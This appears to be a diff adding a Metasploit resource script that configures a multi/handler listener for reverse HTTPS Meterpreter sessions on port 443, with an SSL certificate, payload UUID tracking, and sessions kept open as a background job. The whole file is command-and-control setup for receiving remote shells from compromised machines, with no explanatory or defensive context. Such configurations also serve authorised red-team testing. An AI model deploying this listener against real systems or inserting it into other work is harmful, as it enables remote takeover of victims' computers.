@@ -1,0 +1,13 @@
+setg LPORT 443
+setg PayloadUUIDTracking true
+setg HandlerSSLCert /certs/cert.pem
+setg StagerVerifySSLCert true
+setg IgnoreUnknownPayloads true
+setg LURI /multi
+
+use exploit/multi/handler
+set PAYLOAD multi/meterpreter/reverse_https
+set ExitOnSession false
+exploit -j
+
+back
